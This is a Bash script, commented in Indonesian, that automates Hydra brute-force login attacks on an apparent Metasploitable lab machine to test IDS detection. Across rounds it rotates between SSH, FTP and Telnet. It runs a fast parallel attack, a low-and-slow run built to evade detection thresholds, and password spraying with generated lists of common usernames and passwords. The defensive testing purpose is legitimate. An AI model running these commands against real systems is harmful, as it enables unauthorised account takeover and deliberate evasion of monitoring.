#!/bin/bash

# =================================================================
# SKENARIO 02: BRUTE FORCE (HYDRA) - ROTASI PAYLOAD
# Strategi: 3 Level Depth (Noisy, Low-Slow, Password Spraying)
# Input: Menerima argumen $1 sebagai Nomor Ronde
# =================================================================

# Menerima Input Nomor Ronde dari Daily Round
ROUND=${1:-1} # Default ke ronde 1 jika kosong

# KONFIGURASI
TARGET_IP="192.168.113.50"   # Ganti dengan IP Metasploitable
TARGET_USER="msfadmin"       # User valid
LOG_FILE="logs/hydra_session_$(date +%F).log"

# Warna untuk Tampilan Laporan
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# =================================================================
# LOGIKA ROTASI PAYLOAD (PAYLOAD DIVERSITY)
# Mengubah Protokol & Timing berdasarkan fase ronde
# =================================================================
if [ "$ROUND" -le 10 ]; then
    # --- SET A (Ronde 1-10) ---
    # Protokol: SSH (Default)
    SERVICE_PROTO="ssh"
    # Level 2 Timing: Jeda 5 detik
    WAIT_TIME="5"
    DESC="SSH Brute Force (Port 22)"

elif [ "$ROUND" -le 20 ]; then
    # --- SET B (Ronde 11-20) ---
    # Protokol: FTP (Port 21)
    SERVICE_PROTO="ftp"
    # Level 2 Timing: Jeda 15 detik (Lebih lambat)
    WAIT_TIME="15"
    DESC="FTP Brute Force (Port 21)"

else
    # --- SET C (Ronde 21-30) ---
    # Protokol: Telnet (Port 23)
    SERVICE_PROTO="telnet"
    # Level 2 Timing: Jeda 30 detik (Sangat lambat)
    WAIT_TIME="30"
    DESC="Telnet Brute Force (Port 23)"
fi

# MEMBUAT WORDLIST DUMMY
echo "123456" > logs/pass_short.txt
echo "password" >> logs/pass_short.txt
echo "admin123" >> logs/pass_short.txt
echo "qwerty" >> logs/pass_short.txt
echo "root" >> logs/pass_short.txt
echo "toor" >> logs/pass_short.txt
echo "12345678" >> logs/pass_short.txt
echo "admin" >> logs/pass_short.txt
echo "kali" >> logs/pass_short.txt
echo "sysadmin" >> logs/pass_short.txt
echo "master" >> logs/pass_short.txt
echo "111111" >> logs/pass_short.txt
echo "letmein" >> logs/pass_short.txt
echo "hunter2" >> logs/pass_short.txt
echo "msfadmin" >> logs/pass_short.txt

echo "root" > logs/user_list.txt
echo "admin" >> logs/user_list.txt
echo "support" >> logs/user_list.txt
echo "user" >> logs/user_list.txt
echo "guest" >> logs/user_list.txt
echo "test" >> logs/user_list.txt
echo "oracle" >> logs/user_list.txt
echo "postgres" >> logs/user_list.txt
echo "mysql" >> logs/user_list.txt
echo "tomcat" >> logs/user_list.txt
echo "ubuntu" >> logs/user_list.txt
echo "kali" >> logs/user_list.txt
echo "debian" >> logs/user_list.txt
echo "centos" >> logs/user_list.txt
echo "msfadmin" >> logs/user_list.txt

echo "[+] [02_HYDRA] Memulai Skenario Brute Force..."
echo "[+] Target: $TARGET_IP"
echo "[+] Mode: Ronde $ROUND ($DESC)"
echo "[+] Waktu Mulai: $(date)"

# -----------------------------------------------------------------
# LEVEL 1: NOISY ATTACK (Traditional Brute Force)
# Tujuan: Baseline. Menguji deteksi threshold login gagal.
# Teknik: Parallel tasks (-t 4), cepat.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 1] Running Fast Brute Force (-t 4) on $SERVICE_PROTO...${NC}"

# Simpan Command (Menggunakan variabel $SERVICE_PROTO)
CMD="hydra -l $TARGET_USER -P logs/pass_short.txt $SERVICE_PROTO://$TARGET_IP -t 4 -V"

# Tampilkan Command ke Layar
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command (Log file unik per ronde)
$CMD -o logs/hydra_lvl1_r${ROUND}.txt > /dev/null 2>&1
echo "    -> Selesai. (Harapan: Alert ET SCAN / Brute Force)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 2: LOW & SLOW (Timing Evasion)
# Tujuan: Menguji "Threshold" time window di IDS.
# Teknik: Single task (-t 1) dengan jeda waktu variabel $WAIT_TIME.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 2] Running Low-Slow Attack (-w $WAIT_TIME) on $SERVICE_PROTO...${NC}"

# Simpan Command (Menggunakan variabel $WAIT_TIME)
CMD="hydra -l $TARGET_USER -P logs/pass_short.txt $SERVICE_PROTO://$TARGET_IP -t 1 -w $WAIT_TIME"

# Tampilkan Command ke Layar
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command
$CMD -o logs/hydra_lvl2_r${ROUND}.txt > /dev/null 2>&1
echo "    -> Selesai. (Harapan: Mungkin False Negative / Tidak ada alert)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 3: PASSWORD SPRAYING (Reverse Brute Force)
# Tujuan: Menghindari rule standar "1 IP ke 1 User".
# Teknik: Mencoba 1 Password ke Banyak User.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 3] Running Password Spraying on $SERVICE_PROTO...${NC}"

# Simpan Command
CMD="hydra -L logs/user_list.txt -p password123 $SERVICE_PROTO://$TARGET_IP -t 4"

# Tampilkan Command ke Layar
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command
$CMD -o logs/hydra_lvl3_r${ROUND}.txt > /dev/null 2>&1
echo "    -> Selesai. (Harapan: Alert berbeda/spesifik Spraying)"

# BERSIH-BERSIH
rm logs/pass_short.txt logs/user_list.txt

echo "[+] [02_HYDRA] Skenario Selesai pada $(date)"
echo "-----------------------------------------------------------"
